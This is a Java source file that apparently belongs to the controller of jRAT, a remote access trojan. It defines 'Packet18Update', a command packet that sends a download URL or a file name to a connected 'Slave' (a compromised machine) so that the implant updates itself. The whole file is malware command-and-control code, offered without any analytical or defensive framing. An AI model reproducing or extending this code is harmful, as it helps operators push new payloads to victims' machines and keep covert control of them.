package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;
import java.io.File;

import se.jrat.controller.Slave;

public class Packet18Update extends AbstractOutgoingPacket {

	private String url;
	private boolean local;

	public Packet18Update(String url) {
		this.url = url;
		this.local = false;
	}

	public Packet18Update(File file) {
		this.url = file.getName();
		this.local = true;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(url);
		slave.writeBoolean(local);
	}

	@Override
	public byte getPacketId() {
		return 18;
	}

}
